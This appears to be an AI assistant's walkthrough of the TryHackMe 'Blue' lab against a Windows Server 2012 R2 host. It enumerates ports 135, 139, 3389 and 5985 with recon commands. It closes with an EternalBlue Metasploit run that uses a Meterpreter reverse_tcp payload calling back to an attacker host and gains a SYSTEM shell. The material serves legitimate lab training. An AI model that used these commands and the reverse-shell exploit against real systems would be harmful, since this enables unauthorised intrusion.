KNOWN VULNERABILITIES

Port 135/TCP (MSRPC)

    Primary Risk: Information leakage and lateral movement. The RPC Endpoint Mapper allows unauthenticated queries, and attackers can use tools to enumerate services running on the system, providing intelligence for subsequent attacks.

    Known Issues: There are historical RPC vulnerabilities (such as MS08-067) that could lead to remote code execution, and RPC is often used by worms for lateral propagation.

Port 139/TCP (NetBIOS) & 445/TCP (SMB)

    Critical Vulnerability: SMB Signing Not Required. The scan results show Message signing enabled but not required, which makes the system highly susceptible to SMB Relay Attacks. Attackers can intercept and relay authentication credentials to obtain unauthorized access.

    Historical High-Risk Vulnerabilities: The system is Windows Server 2012 R2, which is inherently vulnerable to EternalBlue (MS17-010) and similar vulnerabilities. Although the scan did not directly detect a patch status, if unpatched, this poses a critical remote code execution risk (such as WannaCry ransomware).

    Information Disclosure: The scan successfully obtained the NetBIOS name, computer name, and workgroup through SMB, and supports guest authentication, which facilitates further attacks.

Port 3389/TCP (RDP)

    Direct Threats: There are recent critical Remote Code Execution (RCE) vulnerabilities, such as CVE-2025-24035 and CVE-2025-24045, both of which affect Windows Server 2012 R2 and have a CVSS score of 8.1. In addition, older vulnerabilities like CVE-2025-21309 also affect this system.

    Brute Force Risk: RDP exposed to the network is highly susceptible to password brute force attacks and credential stuffing.

Port 5985/TCP (WinRM)

    Management Risk: This is the PowerShell Remoting HTTP port. If an attacker obtains valid credentials (especially administrator credentials), they can remotely execute system commands through this port. The scan results show the HTTP service title as "Not Found", and although no specific vulnerability was directly detected, exposing this management interface on an untrusted network significantly increases the attack surface.

Dynamic Ports 49152-49155/TCP (MSRPC)

    Attack Surface: These are dynamically allocated RPC ports for specific services. They themselves are not inherently vulnerable, but their exposure (especially when the firewall does not restrict them) provides additional entry points for attackers to attempt to exploit specific RPC service vulnerabilities.


SMBv1 and EternalBlue (MS17-010): This is a risk inherently associated with this older system. If the system has not installed the MS17-010 patch, it is vulnerable to EternalBlue remote code execution attacks. Your scan results show port 445 is open and SMB signing is not mandatory, which further increases the risk of man-in-the-middle attacks and vulnerability exploitation.

RDP Remote Code Execution Vulnerabilities (CVE-2025-24035 / CVE-2025-24045): These are newer critical vulnerabilities disclosed in 2025, with CVSS scores of 8.1, specifically affecting Windows Server 2012 R2. Your port 3389 is open, and if the corresponding security updates have not been installed, there is a risk of remote code execution.

Netlogon Critical Vulnerability (CVE-2026-41089): This is a more recent critical vulnerability (CVSS 9.8), and the affected product list explicitly includes Windows Server 2012 R2. However, this vulnerability primarily affects servers acting as domain controllers. Your scan results show the workgroup is WORKGROUP, so it may not be a domain controller, but the risk still needs to be verified based on its actual role.






What is the Essence of Port 135

Port 135 is the RPC Endpoint Mapper for Windows. When a program needs to call a remote RPC service (such as LSA, SAMR, Task Scheduler, Service Control Manager), it first connects to port 135 and asks: "Which port is service X listening on?" Port 135 returns a dynamically allocated high port (such as the 49152-49155 you see), and the client then connects to that high port.

This means: Port 135 itself is not the entry point for the vulnerability, but it exposes the "doorplate" of all RPC services. The significance of testing it lies in figuring out which high-value services are running on the target, providing direction for subsequent attacks (such as user enumeration, remote command execution, etc.).

What your rpcdump actually revealed

The 204 endpoints confirm this is a fully-featured Windows Server 2012 R2. The most security-relevant entries are:
Endpoint	Interface	Relevance
367ABB81-9844-35F1-AD32-98F038001003	MS-SCMR (Service Control Manager) on TCP 49171	Remote service creation — useful only with admin creds
12345778-1234-ABCD-EF00-0123456789AC	MS-SAMR (SAM) on TCP 49199 / \pipe\lsass	User enumeration — your enumdomusers returned NT_STATUS_ACCESS_DENIED
12345678-1234-ABCD-EF00-0123456789AB	MS-RPRN (Print System) on TCP 49155	Print Spooler — potential coercion (PrinterBug)
86D35949-83C9-4044-B424-DB363231FD0C	MS-TSCH (Task Scheduler) on TCP 49154	Remote task creation — admin creds only
The critical finding: no unauthenticated exploitation path

Your enumdomusers result — Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED — is the definitive answer for port 135 on this host. Anonymous SAMR access is blocked. There is no public RCE that fires unauthenticated against the endpoint mapper itself on a patched-unknown Server 2012 R2. The endpoints listed are "doors" but every one of them requires credentials.

The one exception worth checking is MS-RPRN (Print Spooler) on TCP 49155. The PrinterBug coercion attack (printerbug.py) can force the target to authenticate to an attacker-controlled host. But that's a relay/coercion primitive, not standalone RCE — it only matters if you have a relay target (e.g., another host without SMB signing) or can capture the NetNTLMv2 hash for cracking. On a single-host THM room, it's a dead end.
What to record and move on

For your per-port testing process, port 135's result is:

    Port 135/TCP — MSRPC Endpoint Mapper. Enumerated 204 endpoints via impacket-rpcdump and Metasploit endpoint_mapper. Key interfaces exposed: MS-SCMR (49171), MS-SAMR (49199), MS-RPRN (49155), MS-TSCH (49154). Anonymous SAMR enumeration denied (NT_STATUS_ACCESS_DENIED). No unauthenticated RCE available. Exploitation requires valid credentials. No standalone exploitation path — proceed to port 445.


What Port 139 Is

Port 139 is the NetBIOS Session Service, responsible for connection-oriented communication over TCP. In modern Windows systems, it primarily serves as the "legacy channel" for SMB over NetBIOS. In other words, when you access SMB through port 139, you are essentially still interacting with the same SMB service behind port 445, just through an older protocol stack.
What You Should Do on Port 139 (and What the Results Will Be)

1. NetBIOS Name Enumeration (Quick Confirmation)

Use nbtscan or nmblookup to confirm the target's NetBIOS name and workgroup:
bash

nbtscan 10.49.175.211
nmblookup -A 10.49.175.211

Your earlier Nmap scan already reported NetBIOS name: WIN-JO6REVNMMMP and Workgroup: WORKGROUP. The result of this step will not add new information; it is merely a process confirmation.

2. SMB Enumeration over Port 139 (Same as Port 445)

Try anonymous SMB enumeration:
bash

enum4linux -a 10.49.175.211

or
bash

smbclient -L //10.49.175.211 -N

Given that your previous rpcclient attempt on port 135 already returned NT_STATUS_ACCESS_DENIED, the probability of obtaining valid users or shares through anonymous SMB enumeration is extremely low. The expected result is: OS information and possibly a share list, but no readable/writable shares.

3. Confirming the True Value of Port 139: SMB Relay

Port 139 itself has no standalone vulnerability. The reason it appears in the scan is simply because Windows Server 2012 R2 enables NetBIOS by default. Its real risk is identical to port 445: SMB signing is not enforced, which means an attacker can capture NTLM authentication traffic from the network and relay it to this host's SMB service. However, this attack path requires a coercion or poisoning prerequisite, and on a single-host THM room, there is typically no second host to relay to.

What your output actually proves
Test	Result	Meaning
nbtscan / nmblookup	WIN-JO6REVNMMMP <00>, WORKGROUP <00>, <20> File Server active	NetBIOS name service is live; <20> confirms SMB file service is advertised over NetBIOS
enum4linux session check	[+] Server allows sessions using username '', password ''	NULL session negotiation succeeds — but this is only the SMB tree-connect handshake, not authenticated RPC access
lsarpc / srvsvc / samr / spoolss	All NT_STATUS_ACCESS_DENIED	Every RPC interface behind the session is blocked to anonymous users
SMB1 workgroup listing	NT_STATUS_RESOURCE_NAME_NOT_FOUND	SMB1 browse/listing is disabled or restricted — consistent with a system where SMB1 is present but not usable for enumeration
smbclient -L -N	"Anonymous login successful" but no share list	Same pattern: negotiation succeeds, enumeration denied

The single most important line is the NULL session success combined with universal ACCESS_DENIED on RPC. On older or misconfigured Server 2012 R2 builds, a NULL session would let you pull user lists, password policy, and shares. Here, RestrictAnonymous / RestrictAnonymousSAM are clearly enforced, so the NULL session is a dead end for enumeration.
The one real finding on port 139

The <20> File Server Service entry and the successful NULL session negotiation confirm that SMB is reachable over NetBIOS — meaning port 139 is an alternate transport to the same SMB stack you will attack on port 445. That matters for one reason only: if port 445 were filtered but 139 open, MS17-010 exploitation would still be possible over NetBIOS. Here both are open, so port 445 remains the preferred transport.

There is no NetBIOS-specific CVE that applies to a Server 2012 R2 host in a way you can exploit unauthenticated. The historical NBNS spoofing/poisoning attacks (Responder-style) require you to be on-path and to have a victim generating NetBIOS name queries — not applicable to a single-host THM room where you are the only client.
What to record for port 139

    Port 139/TCP — NetBIOS Session Service. NetBIOS name confirmed (WIN-JO6REVNMMMP, workgroup WORKGROUP, <20> File Server Service active). NULL session negotiation succeeds, but all RPC interfaces (lsarpc, srvsvc, samr, spoolss) return NT_STATUS_ACCESS_DENIED; anonymous user, share, group, and password-policy enumeration all blocked. SMB1 workgroup listing unavailable. No standalone exploitable vulnerability; port functions only as an alternate SMB transport to port 445.

Your per-port testing process is now complete for 135 and 139, and both converge on the same conclusion: the attack surface is port 445. The anonymous-session-but-access-denied pattern also tells you something useful for later — this box is configured to block unauthenticated RPC, which is why EternalBlue (a pre-auth SMB bug) is the intended path rather than credential-based enumeration.

3389/TCP (RDP): Versions Are Not Vulnerable, No Pre-Auth Exploit Path

Your target is Windows Server 2012 R2. The most famous RDP pre-auth RCE, BlueKeep (CVE-2019-0708), does not affect Server 2012 R2—Microsoft and multiple security agencies explicitly state that Windows 8 and Server 2012 and later versions are not impacted. Therefore, the BlueKeep path is directly ruled out.

What about the 2025 RDP vulnerabilities? CVE-2025-24035 and CVE-2025-24045 do indeed affect Windows Server 2012 R2. However, these two vulnerabilities were only patched in March 2025, and currently there is no mature public weaponized exploit in the wild; CVE-2025-24045 also requires winning a race condition, making exploitation extremely difficult. In the Blue room environment, these two cannot serve as a reliable breakthrough point.

Your practical testing operations on port 3389 should be:
bash

nmap --script "rdp-enum-encryption or rdp-ntlm-info" -p 3389 -T4 10.49.175.211

This will tell you whether the target has NLA enabled, the encryption layer situation, and the NTLM information leaked (computer name, domain, OS build). The expected result is: NLA is typically enabled, and the encryption layer is TLS or CredSSP. If NLA is disabled, theoretically one could attempt an unauthenticated screenshot with nxc rdp --nla-screenshot, but this is of limited significance in the Blue room—your goal is to obtain a shell, not capture a login screen.

Recorded conclusion: Port 3389 is open; the system version is not affected by BlueKeep; the 2025 RDP vulnerabilities lack usable public exploits; NLA status needs confirmation, but there is no pre-auth RCE path. Without credentials, there is no exploitation value.
5985/TCP (WinRM): Zero Direct Vulnerabilities, Purely a Credential Entry Point

Port 5985 is the HTTP listener for WinRM. It has no remotely exploitable vulnerability in itself. Search results consistently indicate that attacks against WinRM are entirely built on "valid credentials"—whether it's crackmapexec winrm verification, evil-winrm interactive login, or Metasploit's winrm_script_exec, all require a username/password or NT hash.

Your operational path on port 5985 is very brief:
bash

# Confirm the service is WinRM (usually already known from nmap scan)
crackmapexec winrm 10.49.175.211
# Without credentials, this will only tell you "the service is there"; it will not return a shell

3389 — RDP enumeration result

The rdp-enum-encryption output tells you three things:

    Native RDP security layer succeeds — the server accepts standard RDP security (not just NLA/CredSSP). This is the default on Server 2012 R2 and is not itself a vulnerability, but it means the server will negotiate RDP security for clients that support it.

    Encryption level: Client Compatible, with 40/56/128-bit RC4 all succeeding. "Client Compatible" means the server will fall back to whatever the client supports, including weak 40-bit RC4. This is the default and is considered a configuration weakness rather than an exploitable vulnerability — it does not give you a pre-auth RCE.

    No NTLM info was returned — the rdp-ntlm-info script produced no output. That typically means NLA is not enforced (the server didn't demand CredSSP/NTLM before letting the connection proceed), which is consistent with "Native RDP: SUCCESS."

Does this change the exploitation picture? No. The absence of enforced NLA means an unauthenticated client can reach the RDP login screen, but you still need credentials to go further. BlueKeep remains inapplicable to Server 2012 R2, and the 2025 RDP CVEs have no usable public exploit. The weak RC4 fallback is worth noting in a report as a hardening finding, not an attack path.

One thing you could try, purely to document it, is an unauthenticated screenshot with nxc rdp --nla-screenshot — but since NLA doesn't appear enforced, it will likely just confirm you can reach the login screen. It won't yield a shell and isn't needed for the Blue room.
5985 — WinRM confirmation result

crackmapexec winrm gave you two useful facts:

    OS fingerprint confirmed: Windows 8.1 / Server 2012 R2 Build 9600, hostname WIN-JO6REVNMMMP, and notably domain: WIN-JO6REVNMMMP — CME is reporting the NetBIOS name as the "domain" because this is a workgroup machine, which matches your earlier WORKGROUP finding.

    WinRM endpoint is live: http://10.49.175.211:5985/wsman responded. With no credentials supplied, CME stops there — no shell, no auth attempt, exactly as expected.

The domain field being the hostname itself is a small but real confirmation: this is a standalone server in a workgroup, not a domain-joined member. That matters because it rules out domain-based attack paths (Kerberoasting, DCsync, etc.) and reinforces that the intended path is a local pre-auth SMB exploit.






You're right — the file you pasted is the **port 135 / 139 / 3389 / 5985** enumeration output, not the port 445 record. Here is the **port 445 consolidated record only**, with every command and output from your logs.

### Port 445 conclusion for the report

> **Port 445/TCP — SMB.** `smb-vuln-ms17-010` reported **VULNERABLE (CVE-2017-0143)**. Exploited with `exploit/windows/smb/ms17_010_eternalblue` + `windows/x64/meterpreter/reverse_tcp` (`LHOST 192.168.152.49:4444`) → **Meterpreter session 1 as `NT AUTHORITY\SYSTEM`** on `10.49.156.48` (`49210 → 4444`). First target `10.49.175.211` wedged its SMB service (`445/tcp closed`) after repeated `Read timeout expired` failures; success came on a fresh boot with a clean kernel pool. `10.49.156.48` is not a valid `LHOST` — it caused `Handler failed to bind`. This is the only viable pre-auth RCE path on the host.
